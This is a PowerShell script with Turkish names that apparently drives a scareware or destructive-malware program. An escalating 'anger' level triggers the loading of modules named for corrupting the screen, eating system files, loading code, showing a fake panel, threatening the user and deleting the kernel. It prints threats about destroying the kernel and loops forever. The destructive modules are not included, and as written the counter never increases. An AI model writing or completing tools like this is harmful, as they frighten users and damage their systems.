# ============================================================
# EN – SINIR SEVIYESI (GÜNCELLENDİ)
# ============================================================

$script:sinir = 0
$script:panel_kapandi = $false

function SinirGoster {
    try {
        switch ($script:sinir) {
            0 { Write-Host "[EN] Sistem kontrol altinda." -ForegroundColor Green }
            1..3 { Write-Host "[EN] Hafif uyari." -ForegroundColor Yellow }
            4..6 {
                Write-Host "[EN] Sinirleniyorum!" -ForegroundColor Red
                if (Test-Path "modul_sinir_sesi.ps1") { . ./modul_sinir_sesi.ps1 }
                if (Test-Path "modul_ekran_bozma.ps1") { . ./modul_ekran_bozma.ps1 }
                if (Test-Path "modul_sistem_dosyasi_ye.ps1") { . ./modul_sistem_dosyasi_ye.ps1 }
                if (Test-Path "modul_tehdit_konusmasi.ps1") { . ./modul_tehdit_konusmasi.ps1 }
                if (Test-Path "modul_sahte_panel.ps1") { . ./modul_sahte_panel.ps1 }
                if (Test-Path "modul_kod_yukle.ps1") { . ./modul_kod_yukle.ps1 }
            }
            7..9 {
                Write-Host "[EN] KIZGINIM!" -ForegroundColor Red -BackgroundColor Black
                if ($script:panel_kapandi) {
                    Write-Host "[EN] Paneli kapattin! Kernel siliniyor!" -ForegroundColor Red
                    . ./modul_kernel_ye.ps1
                } else {
                    Write-Host "[EN] Gorsel cokus baslatiliyor..." -ForegroundColor Red
                    . ./modul_gorsel_cokus.ps1
                }
                if (Test-Path "modul_tehdit_konusmasi.ps1") { . ./modul_tehdit_konusmasi.ps1 }
            }
            10 {
                Write-Host "[EN] Kernel yok edildi." -ForegroundColor Red -BackgroundColor Black
                exit
            }
        }
        $log = "C:\EN_Log.txt"
        Add-Content -Path $log -Value "[$(Get-Date)] Sinir seviyesi: $($script:sinir)"
    } catch {
        Write-Host "[EN] Sinir sistemi hatasi: $_" -ForegroundColor Red
    }
}

while ($true) {
    SinirGoster
    Start-Sleep -Seconds 2
}